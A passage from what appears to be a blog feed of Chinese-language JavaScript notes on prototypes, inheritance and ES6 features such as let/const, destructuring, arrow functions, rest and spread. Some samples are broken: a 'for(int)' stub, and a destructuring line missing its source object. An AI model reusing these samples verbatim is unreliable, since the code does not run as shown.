<li><p>對象成員查找規則：</p>
<ol>
<li>當訪問一個對象的屬性及方法時，首先查找<font color="#f54747">對象自身</font>有沒有該屬性</li>
<li>如果沒有，則查找它的原型 (也就是<code>__proto__</code>指向的<font color="#f54747"><code>prototype</code>原型對象</font>)</li>
<li>如果沒有，則查找原型對象的原型 (<font color="#f54747">Object的原型對象</font>)</li>
<li>以此類推直到找到Object為止 (<font color="#f54747">null</font>)</li>
<li><code>__proto__</code>對象原型的意義在於為對象的查找機制提供一個方向</li>
</ol>
</li>
</ol>
<h3 id="原型對象的其他應用"><a href="#原型對象的其他應用" class="headerlink" title="原型對象的其他應用"></a>原型對象的其他應用</h3><ol>
<li>擴展內置的對象<ul>
<li><p>可以通過原型對象，對原來的內置對象進行擴展自定義的方法<br>  比如給數組增加自定義的功能：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sum</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(int)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="#f54747">注意：數組和字符串內置對象不能給原型對象進行覆蓋操作，只允許追加</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 允許追加操作</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">xxx</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不允許覆蓋操作</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">xxx</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="組合繼承"><a href="#組合繼承" class="headerlink" title="組合繼承"></a>組合繼承</h2><ol>
<li><p>簡介：</p>
<ul>
<li>在ES6之前，並沒有<code>extends</code>繼承，但可以通過<font color="#f54747">構造函數+原型對象</font>模擬實現繼承，稱為<font color="#f54747">組合繼承</font></li>
</ul>
</li>
<li><p><code>call()</code>方法</p>
<ul>
<li>作用：調用函數並且修改<code>this</code>的指向  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的其他參數</span></span><br><span class="line">fn.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="利用構造函數繼承"><a href="#利用構造函數繼承" class="headerlink" title="利用構造函數繼承"></a>利用構造函數繼承</h3><ol>
<li><p>核心原理：</p>
<ol>
<li>通過<code>call()</code>把父構造函數的<code>this</code>指向子構造函數的<code>this</code></li>
<li>運行父構造函數的時候，因為父構造函數中<code>this</code>指向子構造函數，就會給子構造函數中添加父構造函數的屬性及方法</li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params">uname, age, gender</span>)&#123;</span><br><span class="line">    <span class="comment">// 調用父構造函數，並把父構造函數的this指向子構造函數的this</span></span><br><span class="line">    <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, uname, age)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="原型對象繼承方法"><a href="#原型對象繼承方法" class="headerlink" title="原型對象繼承方法"></a>原型對象繼承方法</h3><ol>
<li><p>簡介：</p>
<ul>
<li>由於父構造函數與子構造函數擁有自己的原型對象，因此子構造函數不能調用父構造函數原型對象上的屬性和方法</li>
</ul>
</li>
<li><p>核心原理：<br> 將子構造函數的原型對象指向父構造函數創造的實例對象，由於父構造函數的實例對象能指向父構造函數的原型對象，子構造函數原型對象也能調用父構造函數的原型對象中的屬性和方法</p>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建父構造函數的實例，因此子構造函數的原型對象就能指向父構造函數的原型對象</span></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>()</span><br><span class="line"><span class="comment">// 由於利用對象修改了原型對象，需要使用constructor重新指向原來的構造函數</span></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Child</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>圖示：</p>
 <img src="https://p.ipic.vip/totn93.png" width="600px"/></li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES6</title>
    <url>/myBlog/2022/07/23/2022/FrontEnd/2022-7-23-JS-ES6/</url>
    <content><![CDATA[<h2 id="數據聲明"><a href="#數據聲明" class="headerlink" title="數據聲明"></a>數據聲明</h2><h3 id="let關鍵字"><a href="#let關鍵字" class="headerlink" title="let關鍵字"></a>let關鍵字</h3><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 中新增用於聲明變量的關鍵字</li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>變量不能重複聲明</p>
</li>
<li><p>具有模塊作用域</p>
<ul>
<li><code>let</code>聲明的變量只在所處於的塊級有效</li>
<li>防止循環變量變成全局變量</li>
<li>例子：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">10</span></span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)      <span class="comment">// b = 20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i)      <span class="comment">// err: i is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(j)      <span class="comment">// j = 2</span></span><br></pre></td></tr></table></figure></li>
<li>注意：使用<code>let</code>關鍵字聲明的變量才具有塊級作用域，使用<code>var</code>關鍵字聲明的變量不具備塊級作用域的特性</li>
</ul>
</li>
<li><p>不存在變量提升</p>
<ul>
<li><code>var</code>關鍵字聲明的變量存在變量提升，因此存在先使用後聲明的處境</li>
<li><code>let</code>關鍵字聲明的變量不存在變量提升  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// a = undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">20</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>存有暫時性死區特性</p>
<ul>
<li>在塊級區域使用<code>let</code>聲明的變量會被整體綁定在該塊級區域，不受外部代碼影響  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num);   <span class="comment">// err: num is not defined</span></span><br><span class="line">    <span class="keyword">let</span> num = <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果塊級中使用了 let 關鍵字聲明重名變量變量</span></span><br><span class="line"><span class="comment">    就會和塊級區域整體進行綁定，在當前區域中的變量與外部是沒有關係</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="const關鍵字"><a href="#const關鍵字" class="headerlink" title="const關鍵字"></a>const關鍵字</h3><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 新增用於聲明常量的關鍵字</li>
<li>常量就是值<font color="#f54747">（內存地址）</font>不能變化的量</li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>聲明常量時必須賦值</p>
</li>
<li><p>具有模塊作用域</p>
<ul>
<li><code>const</code>聲明的變量只在所處於的塊級有效  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>常量賦值後值不能修改</p>
<ul>
<li>基本數據類型中，常量的值不可更改  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span></span><br><span class="line"><span class="variable constant_">PI</span> = <span class="number">100</span>    <span class="comment">// Assignment to constant variable</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組與對象的元素修改，不算做對常量的修改</p>
<ul>
<li>複雜數據類型中，數據結構內部的值可更改，但常量的地址不可更改  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">100</span>, <span class="number">200</span>]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)    <span class="comment">// [&#x27;a&#x27;,&#x27;b&#x27;]</span></span><br><span class="line">arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]    <span class="comment">// Assignment to constant variable</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="聲明方法的區別"><a href="#聲明方法的區別" class="headerlink" title="聲明方法的區別"></a>聲明方法的區別</h3><ol>
<li><p>使用<font color="#f54747"><code>var</code></font>聲明的變量，其作用域為<font color="#f54747">該語句所在的函數內，且存在變量提升現象</font></p>
</li>
<li><p>使用<font color="#f54747"><code>let</code></font>聲明的變量，其作用域為<font color="#f54747">該語句所在的代碼塊內，不存在變量提升</font></p>
</li>
<li><p>使用<font color="#f54747"><code>const</code></font>聲明的是常量，在後面出現的代碼中<font color="#f54747">不能再修改該常量的值</font></p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center"><code>var</code></th>
<th align="center"><code>let</code></th>
<th align="center"><code>const</code></th>
</tr>
</thead>
<tbody><tr>
<td align="center">函數級作用域</td>
<td align="center">塊級作用域</td>
<td align="center">塊級作用域</td>
</tr>
<tr>
<td align="center">變量提升</td>
<td align="center">不存在變量提升</td>
<td align="center">不存在變量提升</td>
</tr>
<tr>
<td align="center">值可更改</td>
<td align="center">值可更改</td>
<td align="center">值不可更改</td>
</tr>
</tbody></table>
<h2 id="解構賦值"><a href="#解構賦值" class="headerlink" title="解構賦值"></a>解構賦值</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許按照一定模式從數組和對象中提取值，對變量進行賦值</li>
</ul>
</li>
<li><p>數組解構</p>
<ul>
<li>數組解構允許我們按照一一對應的關係從數組中提取值，然後賦值給變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = arr         <span class="comment">// a = 1, b = 2, c = 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果解構不成功，變量的值為 undefined</span></span><br><span class="line"><span class="keyword">let</span> [a, b, c, d] = arr      <span class="comment">// d = undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>對象解構</p>
<ol>
<li><p>變量名與屬性名相同</p>
<ul>
<li>對象解構允許我們使用變量的名字匹配對象的屬性，匹配成功將對象屬性賦值給變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;age, name&#125; = person    <span class="comment">// name = &#x27;Donald&#x27;, age = 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果解構不成功，變量的值為 undefined   </span></span><br><span class="line"><span class="keyword">let</span> &#123;name, age, gender&#125; = person    <span class="comment">// gender = undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>變量名與屬性名不同</p>
<ul>
<li>這種寫法將左側用於進行屬性匹配，匹配成功後將對象屬性賦值給右側的別名  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: myName, <span class="attr">age</span>: myAge&#125;      <span class="comment">// myName = &#x27;Donald&#x27;, myAge = 20</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入新的聲明字符串的方式</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`Hello World`</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>內容中可以直接出現換行符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;ul&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 1&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 2&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 3&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;`</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>變量拼接</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = <span class="string">&#x27;Hello &#x27;</span></span><br><span class="line"><span class="keyword">let</span> str2 = <span class="string">`<span class="subst">$&#123;str1&#125;</span>World`</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str2)       <span class="comment">// Hello World</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="箭頭函數"><a href="#箭頭函數" class="headerlink" title="箭頭函數"></a>箭頭函數</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許使用箭頭來定義函數</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params">args</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 函數體</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p><code>this</code>是靜態的</p>
<ul>
<li><p>在傳統函數中，<code>this</code>指向的是函數的<font color="#f54747">調用者</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;Window&#x27;</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Object&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getName</span>()  <span class="comment">// Window</span></span><br><span class="line">getName.<span class="title function_">call</span>(person)   <span class="comment">// Object</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在箭頭函數中，<code>this</code>指向的是<font color="#f54747">函數聲明時所在作用域下的<code>this</code>指向</font><br>  箭頭函數沒有自己的<code>this</code>，如果在函數中調用<code>this</code>則指向箭頭函數定義位置的<code>this</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;Window&#x27;</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Object&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">getName</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getName</span>()   <span class="comment">// Window</span></span><br><span class="line">getName.<span class="title function_">call</span>(person)    <span class="comment">// Window （函數永遠指向聲明時，函數所在作用域的 this 指向）</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>不能作為構造函數實例化對象</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">Person</span> = (<span class="params">name, age</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> donald = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald)     <span class="comment">// Person is not a constructor</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>不能使用<code>arguments</code>變量</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment">// arguments is not defined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>箭頭函數的簡寫</p>
<ol>
<li><p>省略<code>()</code>，當形參有且只有一個的時候</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">double</span> = n =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> n + n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>省略<code>&#123;&#125;</code>，當代碼體只有一條語句時（如果語句的執行結果就是函數的返回值，<code>return</code>必須省略）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">square</span> = n =&gt; n * n</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>箭頭函數的應用場景</p>
<ul>
<li>箭頭函數適用於：與<code>this</code>無關的回調，例如：定時器、數組的方法回調</li>
<li>箭頭函數不適用於：與<code>this</code>有關的回調，例如：DOM的事件回調、對象的方法</li>
</ul>
</li>
<li><p>箭頭函數面試題</p>
<ol>
<li>對象中箭頭函數的<code>this</code>指向問題 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">age</span>:<span class="number">20</span>,</span><br><span class="line">    <span class="attr">say</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">age</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">say</span>()   <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    由於箭頭函數並沒有自己的 this 指向，而對象 obj 並不能產生作用域，因此箭頭函數實則被定義在全局作用域下</span></span><br><span class="line"><span class="comment">    所以在調用 say() 方法時，this 指向的是 Window，而 Window 並未聲明 age 屬性，因此返回 undefined</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="函數參數的默認設置"><a href="#函數參數的默認設置" class="headerlink" title="函數參數的默認設置"></a>函數參數的默認設置</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許給函數參數賦予初始值</li>
</ul>
</li>
<li><p>形參初始值</p>
<ul>
<li>能給形參設置初始化值</li>
<li>注：具有默認值的參數位置一半靠後</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b, c = <span class="number">10</span></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>))   <span class="comment">// 13</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>與解構賦值結合</p>
<ul>
<li>能在傳遞參數的時候同時使用解構賦值，節省使用<code>this</code>重新賦值</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params">&#123;host=<span class="string">&#x27;127.0.0.1&#x27;</span>, username, password, port&#125;</span>)&#123;</span><br><span class="line">    <span class="comment">// let host = this.host</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(host)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">connect</span>(&#123;</span><br><span class="line">    <span class="comment">// host:&#x27;localhost&#x27;,</span></span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">3306</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="rest-參數"><a href="#rest-參數" class="headerlink" title="rest 參數"></a>rest 參數</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入<code>rest</code>參數，用於獲取函數的實參，用來代替<code>arguments</code></li>
</ul>
</li>
<li><p>ES5獲取實參的方法：</p>
<ul>
<li>利用<code>arguments</code>獲取實參</li>
<li>注：<code>arguments</code>並不是數組，是一個<font color="#f54747">對象</font></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">students</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">students</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>rest</code>參數獲取實參：</p>
<ul>
<li>語法：<code>...args</code></li>
<li><code>args</code>是一個<font color="#f54747">數組</font>，因此可以使用數組的API方法，例如<code>filter()</code>、<code>map()</code>、<code>some()</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">students</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">students</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>)   <span class="comment">// [&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li>注意：<font color="#f54747"><code>rest</code>參數必須放到參數的最後</font></li>
</ul>
</li>
<li><p><code>rest</code>參數配合解構使用：</p>
<ul>
<li>解構變量寫法也可以寫成剩餘參數的形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> [a1, ...args] = arr     <span class="comment">// a1 = 1, args = [2, 3, 4]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="擴展運算符-spread"><a href="#擴展運算符-spread" class="headerlink" title="擴展運算符 spread"></a>擴展運算符 spread</h2><ol>
<li><p>簡介：</p>
<ul>
<li>將數組轉換為都好分隔的「參數序列」</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> students = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>]  <span class="comment">// =&gt; &#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getName</span>(students)       <span class="comment">// === getName([&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;])</span></span><br><span class="line"><span class="title function_">getName</span>(...students)    <span class="comment">// === getName(&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;)        </span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>應用：</p>
<ol>
<li><p>合併數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> boys = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> girls = [<span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> students = boys.<span class="title function_">concat</span>(girls)     <span class="comment">// ES5 的數組API方法</span></span><br><span class="line"><span class="keyword">const</span> students = [...boys, ...girls]    <span class="comment">// === [&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;, &#x27;Lily&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>複製數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> boys = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> men = [...boys]</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果數組裡面的元素有引用類型數據，是<font color="#f54747">淺拷貝</font></li>
</ul>
</li>
<li><p>將偽數組轉為真數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> divs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(divs)       <span class="comment">// NodeList</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...divs])  <span class="comment">// Array</span></span><br></pre></td></tr></table></figure>
<ul>
<li>轉換之後，就可以使用數組的API方法</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Class &amp; Object</title>
    <url>/myBlog/2022/07/09/2022/FrontEnd/2022-7-9-JS-Class&amp;Object/</url>
    <content><![CDATA[<h2 id="面向對象編程思想"><a href="#面向對象編程思想" class="headerlink" title="面向對象編程思想"></a>面向對象編程思想</h2><ol>
<li><p>面向過程編程POP (Process-oriented programming)</p>
<ul>
<li>分析出解決問題所需的步驟，然後同函數吧這些步驟一步步的實現，使用的時候再一個個的依照次序調用</li>
</ul>
</li>
<li><p>面向對象編程OOP (Object-oriented programming)</p>
<ul>
